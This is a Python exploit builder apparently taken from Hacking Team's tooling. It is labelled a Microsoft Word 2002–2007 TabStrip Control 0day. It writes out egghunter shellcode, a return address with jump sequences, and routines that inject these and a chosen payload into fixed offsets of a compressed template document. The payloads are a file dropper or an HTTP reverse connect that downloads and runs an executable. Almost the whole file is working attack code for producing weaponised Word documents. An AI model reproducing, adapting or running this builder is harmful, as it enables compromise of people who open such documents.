#! /usr/bin/env python

#Copyright HT srl, 2009-2010
#http://www.hackingteam.it/ for more information

#cod

# Microsoft Word 0day


import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile

import jscript_unicode
import x86shelldrophttp
import x86int3
import ASCIIHexWhitespace
import x86helloworld

from resources import compressedfile

NAME='Word 2007 SP2 / 2003 SP3 / 2002 SP3 TabStrip Control Exploit' 
DESCRIPTION='[+] 0DAY - No details available'

DOCUMENTATION={}
DOCUMENTATION['Vendor']='Microsoft'
DOCUMENTATION['Date public']='N/A'
DOCUMENTATION['References']='http://www.microsoft.com/'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Word XP SP3/2003SP3/2007SP2'
DOCUMENTATION['CVE']='CVE-????-????'
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-????-????"

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP', 'VISTA', 'SEVEN']
PROPERTY['VENDOR']='Microsoft'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
Tested on:
Windows XP Professional SP3/VISTA/SEVEN with Microsoft Office XP/2003/2007
Windows Vista
Windows SEVEN
"""

CHANGELOG="""
"""

# Global payload
payload = 0

#from pyPdf.pdf import *
#from pyPdf.generic import *
#from pyPdf.filters import *

###
#START:
# OR DX, 0xFFFF
#INCREMENT:
# INC EDX
# PUSH EDX
# PUSH 2
# POP EAX
# INT 2E
# CMP AL, 5
# POP EDX
# JE START
# MOV EAX, 0x90419041
# MOV EDI, EDX
# SCASD
# JNE INCREMENT
# SCASD
# JNE INCREMENT
# JMP EDI
###

egghunter = (b"\x31\xd2"
b"\x66\x81\xca\xff\xff\x42\x83\xc2\x7c\x52\x6a\x02\x58\xcd\x2e\x3c"
b"\x05\x5a\x74\xec\xb8\x41\x90\x41\x90\x89\xd7\xaf\x75\xdd\xaf\x75"
b"\xda\xff\xe7"
)

egghunter = (b"\x31\xd2"
b"\x66\x81\xca\xff\xff\x42\x83\xc2\x7c\x52\x6a\x02\x58\xcd\x2e\x3c"
b"\x05\x5a\x74\xec\xeb\x09\x90\x90\x90\x90\x90\x90\x90\x90\x90\xb8"
b"\x41\x90\x41\x90\x89\xd7\xaf\x75\xdd\xaf\x75\xda\xff\xe7"
)


class msxx_xxx():
	def __init__(self, inputFile, outputFile, dbg):
		#self.setInfo(DESCRIPTION)
		self.name=NAME
		self.debugmode = dbg

		#self.source_pdf = 'resources/blank.pdf'
		self.dest_doc = outputFile
		self.infile = inputFile
		
		return

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename

	def createShellcode(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.infile)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.infile)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
			
		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	def make_doc(self):
		input = bytearray(zlib.decompress(compressedfile))
		#input = bytearray(self.compressedfile)
		
		#secondstage = 
		shellcode = self.createShellcode()

		retadd = b"\xDA\x89\x5b\x27\xFF\xFF\xEB\x08\x90\x90\x00\x00\x00\x00\x00\x00\x81\xEC\x5B\x27\x00\x00\xEB\x18"   #return address + jmp to sub esp, 275Bh; jmp egghunter

		for i in range(0,0x18):
			input[0xA28C + i] = retadd[i]
			input[0xA318 + i] = retadd[i]
			input[0xA3A4 + i] = retadd[i]
			input[0xA430 + i] = retadd[i]
			input[0xA4D4 + i] = retadd[i]
			input[0xA560 + i] = retadd[i]
			input[0xA5EC + i] = retadd[i]
			input[0xA678 + i] = retadd[i]
			input[0xA71C + i] = retadd[i]
			input[0xA7A8 + i] = retadd[i]
			input[0xA834 + i] = retadd[i]
			input[0xA8C0 + i] = retadd[i]
			input[0xA964 + i] = retadd[i]
			input[0xA9F0 + i] = retadd[i]
			input[0xAA7C + i] = retadd[i]
			input[0xAB08 + i] = retadd[i]
			input[0xABAC + i] = retadd[i]
			input[0xAC38 + i] = retadd[i]
			input[0xACC4 + i] = retadd[i]
			input[0xAD50 + i] = retadd[i]
			
		for i in range(0,len(egghunter)):
			input[0xA28C + 0x30 + i] = egghunter[i]
			input[0xA318 + 0x30 + i] = egghunter[i]
			input[0xA3A4 + 0x30 + i] = egghunter[i]
			input[0xA430 + 0x30 + i] = egghunter[i]
			input[0xA4D4 + 0x30 + i] = egghunter[i]
			input[0xA560 + 0x30 + i] = egghunter[i]
			input[0xA5EC + 0x30 + i] = egghunter[i]
			input[0xA678 + 0x30 + i] = egghunter[i]
			input[0xA71C + 0x30 + i] = egghunter[i]
			input[0xA7A8 + 0x30 + i] = egghunter[i]
			input[0xA834 + 0x30 + i] = egghunter[i]
			input[0xA8C0 + 0x30 + i] = egghunter[i]
			input[0xA964 + 0x30 + i] = egghunter[i]
			input[0xA9F0 + 0x30 + i] = egghunter[i]
			input[0xAA7C + 0x30 + i] = egghunter[i]
			input[0xAB08 + 0x30 + i] = egghunter[i]
			input[0xABAC + 0x30 + i] = egghunter[i]
			input[0xAC38 + 0x30 + i] = egghunter[i]
			input[0xACC4 + 0x30 + i] = egghunter[i]
			input[0xAD50 + 0x30 + i] = egghunter[i]
			
		for i in range(0,4):
			input[0xA28C + 0x64 + i] = b"\x00"[0]
			input[0xA318 + 0x64 + i] = b"\x00"[0]
			input[0xA3A4 + 0x64 + i] = b"\x00"[0]
			input[0xA430 + 0x64 + i] = b"\x00"[0]
			input[0xA4D4 + 0x64 + i] = b"\x00"[0]
			input[0xA560 + 0x64 + i] = b"\x00"[0]
			input[0xA5EC + 0x64 + i] = b"\x00"[0]
			input[0xA678 + 0x64 + i] = b"\x00"[0]
			input[0xA71C + 0x64 + i] = b"\x00"[0]
			input[0xA7A8 + 0x64 + i] = b"\x00"[0]
			input[0xA834 + 0x64 + i] = b"\x00"[0]
			input[0xA8C0 + 0x64 + i] = b"\x00"[0]
			input[0xA964 + 0x64 + i] = b"\x00"[0]
			input[0xA9F0 + 0x64 + i] = b"\x00"[0]
			input[0xAA7C + 0x64 + i] = b"\x00"[0]
			input[0xAB08 + 0x64 + i] = b"\x00"[0]
			input[0xABAC + 0x64 + i] = b"\x00"[0]
			input[0xAC38 + 0x64 + i] = b"\x00"[0]
			input[0xACC4 + 0x64 + i] = b"\x00"[0]
			input[0xAD50 + 0x64 + i] = b"\x00"[0]
			
		offset = 0xB730
		for i in range(0,256):
			input[offset + i] = b"\x41\x90"[i%2]                                       #egg hunted

		for i in range(0,len(shellcode)):
			input[offset + 0x100 + i] = shellcode[i]

		# Create the output archive
		print "Creating %s file "%(self.dest_doc)
			
		f = open(self.dest_doc,mode='wb')
		f.write(input)
		f.close()
		
		return 0

	def run(self):
		return self.make_doc()

if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 3:
		print "[ERROR] %s require 3 parameters"%(DESCRIPTION)
		print "[-INFO] [DROPFILE] destination [-debug | -http]"
		sys.exit(0)

	if len(sys.argv) > 2:
		for i in range(2, len(sys.argv)):
			if sys.argv[i] == '-http':
				print "[HTTP] Using HTTP reverse connect to download exe"
				payload = 1
				http = True
			elif sys.argv[i] == '-debug':
				print "[DEBUG] Using INT3 exploit mode"
				dbg = True
			elif sys.argv[i] == '-hello':
				print "[HELLOWORLD] Using HelloWorld payload"
				payload = 2

	if http == False:
		if os.path.isfile(sys.argv[1]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[1])
			sys.exit(0)

		if os.path.getsize(sys.argv[1]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[1])
			sys.exit(0)

	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)
	
	app=msxx_xxx(sys.argv[1], sys.argv[2], dbg)
	app.run()
	
	print ' ... done'